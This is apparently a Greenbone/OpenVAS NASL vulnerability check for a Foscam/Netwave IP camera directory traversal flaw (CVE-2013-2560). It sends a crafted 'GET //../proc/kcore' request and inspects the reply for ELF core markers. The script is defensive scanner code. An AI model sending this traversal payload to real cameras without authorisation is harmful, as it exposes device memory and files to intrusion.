if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.103679" );
	script_bugtraq_id( 58290 );
	script_cve_id( "CVE-2013-2560" );
	script_tag( name: "cvss_base", value: "7.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:N/A:N" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_name( "Foscam Prior to 11.37.2.49 Directory Traversal Vulnerability" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/58290" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2013-03-15 12:24:18 +0100 (Fri, 15 Mar 2013)" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2013 Greenbone Networks GmbH" );
	script_dependencies( "gb_get_http_banner.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "Netwave_IP_Camera/banner" );
	script_tag( name: "solution", value: "Updates are available. Please see the references or vendor advisory
for more information." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "summary", value: "Foscam is prone to a directory-traversal vulnerability.

Remote attackers can use specially crafted requests with directory-
traversal sequences ('../') to retrieve arbitrary files in the context
of the application. This may aid in further attacks." );
	exit( 0 );
}
require("http_func.inc.sc");
require("port_service_func.inc.sc");
require("host_details.inc.sc");
port = http_get_port( default: 80 );
banner = http_get_remote_headers( port: port );
if(!ContainsString( banner, "Netwave IP Camera" )){
	exit( 0 );
}
soc = open_sock_tcp( port );
if(!soc){
	exit( 0 );
}
send( socket: soc, data: NASLString( "GET //../proc/kcore HTTP/1.0\\r\\n\\r\\n" ) );
recv = recv( socket: soc, length: 500 );
close( soc );
if(ContainsString( recv, "ELF" ) && ContainsString( recv, "CORE" )){
	security_message( port: port );
	exit( 0 );
}
exit( 0 );

